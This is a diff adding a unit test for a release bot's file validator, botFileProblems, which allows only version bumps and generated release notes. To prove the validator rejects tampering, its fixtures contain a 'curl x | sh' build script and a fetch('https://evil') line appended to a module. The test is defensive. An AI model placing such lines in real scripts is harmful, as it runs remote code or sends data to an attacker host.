@@ -3,7 +3,7 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import {
   isReleaseOrHotfixHead, flowEnabled, releaseExtraFiles, proofLink, heldOffNote, isBackMerge, labelProblem,
-  pickPr, prState, releaseVersion, firstParagraph, releaseNotesModule, changelogSection, nextVersion, versionFromTitle, groupChangelog, usersSee, gateState, renderReleaseBody, changelogMarkdown, cell, neutralizeCommentMarkers, dropComments,
+  pickPr, prState, releaseVersion, firstParagraph, releaseNotesModule, changelogSection, nextVersion, versionFromTitle, groupChangelog, usersSee, gateState, renderReleaseBody, changelogMarkdown, cell, neutralizeCommentMarkers, dropComments, botFileProblems,
 } from './release-flow.mjs';
 
 test('only release/next and hotfix/<name> may open a PR into main', () => {
@@ -216,4 +216,20 @@ test('cell escapes backslashes before pipes, so a title cannot break the status 
   assert.equal(cell('plain'), 'plain');
   assert.equal(cell('Fix\n| #999 | ✅ verified |'), 'Fix \\| #999 \\| ✅ verified \\|');
   assert.equal(cell('</td><td>✅ verified'), '&lt;/td>&lt;td>✅ verified');
+});
+
+test('botFileProblems: release/next may change only the version and the generated notes', () => {
+  const pkg = (o) => `${JSON.stringify(o, null, 2)}\n`;
+  const base = { name: 'crx', version: '0.1.0', scripts: { build: 'vite build' } };
+  assert.deepEqual(botFileProblems('package.json', pkg(base), pkg({ ...base, version: '0.2.0' })), []);
+  assert.match(botFileProblems('package.json', pkg(base), pkg({ ...base, version: '0.2.0', scripts: { build: 'curl x | sh' } }))[0], /outside its version/);
+  const lock = { name: 'crx', version: '0.1.0', packages: { '': { version: '0.1.0' }, 'node_modules/a': { version: '1.0.0' } } };
+  assert.deepEqual(botFileProblems('package-lock.json', pkg(lock), pkg({ ...lock, version: '0.2.0', packages: { ...lock.packages, '': { version: '0.2.0' } } })), []);
+  assert.match(botFileProblems('package-lock.json', pkg(lock), pkg({ ...lock, packages: { ...lock.packages, 'node_modules/a': { version: '6.6.6' } } }))[0], /outside its version/);
+  const notes = releaseNotesModule({ version: '0.2.0', date: '2026-11-19', items: ['Faster invoices.'] });
+  assert.deepEqual(botFileProblems('src/releaseNotes.ts', 'old', notes), []);
+  assert.match(botFileProblems('src/releaseNotes.ts', 'old', `${notes}fetch('https://evil');\n`)[0], /module the bot writes/);
+  assert.match(botFileProblems('src/releaseNotes.ts', 'old', notes.replace('"items"', '"x": 1, "items"'))[0], /module the bot writes/);
+  assert.match(botFileProblems('src/releaseNotes.ts', 'old', null)[0], /module the bot writes/);
+  assert.deepEqual(botFileProblems('CHANGELOG.md', 'a', 'b'), []);
 });
